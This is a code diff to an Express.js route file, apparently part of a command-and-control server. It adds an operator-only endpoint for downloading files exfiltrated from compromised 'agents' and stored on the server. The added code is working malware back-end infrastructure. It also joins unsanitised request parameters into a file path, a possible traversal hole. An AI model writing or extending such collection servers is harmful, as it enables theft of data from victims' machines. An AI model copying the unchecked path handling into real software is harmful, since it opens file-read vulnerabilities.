@@ -1,5 +1,7 @@
 const express = require('express');
 const router = express.Router();
+const path = require('path');
+const fs = require('fs');
 const { verifyToken } = require('../middleware/auth');
 const Task = require('../models/task');
 const Result = require('../models/result');
@@ -46,6 +48,41 @@ router.post('/', verifyToken, (req, res) => {
   } catch (err) {
     console.error('[TASK] Error:', err.message);
     res.status(500).json({ error: 'Failed to create task' });
+  }
+});
+
+/**
+ * GET /api/tasks/download/:agentId/:filename
+ * Download an exfiltrated file
+ * Auth: JWT (operator)
+ */
+router.get('/download/:agentId/:filename', verifyToken, (req, res) => {
+  console.log(`[DOWNLOAD] Handler reached for agent: ${req.params.agentId}, file: ${req.params.filename}`);
+  try {
+    const { agentId, filename } = req.params;
+    const EXFIL_DIR = path.join(__dirname, '../../exfiltrated_files');
+    const filePath = path.join(EXFIL_DIR, agentId, filename);
+
+    if (!fs.existsSync(filePath)) {
+      console.error(`[DOWNLOAD] File not found on disk: ${filePath}`);
+      return res.status(404).json({ error: 'File not found' });
+    }
+
+    // Set headers to force download and preserve original filename (strip the timestamp prefix)
+    const originalName = filename.split('_').slice(1).join('_') || filename;
+    
+    console.log(`[DOWNLOAD] Serving file: ${originalName} from ${filePath}`);
+    res.download(filePath, originalName, (err) => {
+      if (err) {
+        console.error(`[DOWNLOAD] Error during transmission: ${err.message}`);
+        if (!res.headersSent) {
+          res.status(500).json({ error: 'Download failed during transmission' });
+        }
+      }
+    });
+  } catch (err) {
+    console.error('[DOWNLOAD] Catch block error:', err.message);
+    res.status(500).json({ error: 'Internal server error during download' });
   }
 });
 
